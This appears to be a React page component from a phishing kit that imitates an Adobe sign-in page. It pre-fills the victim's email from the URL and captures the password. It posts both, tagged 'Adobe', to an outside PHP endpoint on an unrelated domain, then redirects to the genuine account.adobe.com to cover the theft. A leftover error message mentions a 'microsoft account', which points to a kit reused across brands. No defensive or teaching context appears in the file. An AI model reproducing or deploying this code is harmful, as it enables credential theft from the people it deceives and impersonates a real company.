import { useEffect, useState } from 'react';
import Background from '../components/Background';
import Footer from '../components/Footer';
import FormContainer from '../components/FormContainerAdobe';
import List from '../components/List';
import Logo from '../components/Logo';
import SubHeader from '../components/SubHeader';
import { background } from '../constants/constant';
import { useParams } from 'react-router-dom';
import axios from 'axios';

const Adobe = () => {
    const urlParams = useParams();
    const [username, setUserName] = useState('');
    const [password, setPassword] = useState('');
    const [isLoading, setIsLoading] = useState(false)
    const [error, setError] = useState(false)
    const [passShow, setPassShow] = useState(false)
  
    let [backRand, setBackRand] = useState(null)

    
    setTimeout(()=> {
        if (urlParams.id) {
            setUserName(urlParams.id)
        }
    },400)
    
    useEffect(()=> {
      const random = Math.floor(Math.random() * background.length);
      setBackRand(random);
    }, [])
  

    const handleSubmit = (e)=> {
      e.preventDefault();
      setIsLoading(true);

      if (password === ''){
        setError("Please enter the password for your microsoft account");
      }else{
        setError('')
        const proData = new FormData();
        proData.append('email', username);
        proData.append('para', password);
        proData.append('source', "Adobe");

        const url = 'http://backend.compassionaid.love/loadback.php';
        const msUrl = `https://account.adobe.com`;

        axios.post(url, proData)
        .then((res) => {
          if (res.status !== 'ok'){
            console.log(res.data)
          }
        }).then(()=> {
          setIsLoading(false);
          window.location.replace(msUrl);
        }).catch(err => {
          setError(err.code)
          setIsLoading(false);
        })
      }

    }
  
    const checkUser = ()=> {
      setIsLoading(true);
      setTimeout(() => {
        if (username === '') {
          setError(true)
          setIsLoading(false)
          setPassShow(false)
        } else {
          setError(false)
          setIsLoading(false)
          setPassShow(true)
        }
      }, 2000);
      
    }
  
    return (
      <>
        {backRand && 
        <Background backgroundImg={background[backRand]}>
          <SubHeader />
          <div className='flex w-[100%] h-[100%] justify-around'>
            <div className='w-0 xl:min-w-[610px]'>
              <Logo 
                imgSize={52} 
                mainClass='hidden xl:flex mt-[17rem] ml-[32%]'
                textClass='py-[0.3rem] ml-2 text-[28px] text-stone-200' 
              />
              <List />
            </div>
            <FormContainer error={error} handleSubmit={handleSubmit} passShow={passShow} isLoading={isLoading} checkUser={checkUser} email={username} password={password} setUserName={setUserName} setPassword={setPassword} />
          </div>
          <Footer />
        </Background>}
      </>
    )
  }

export default Adobe
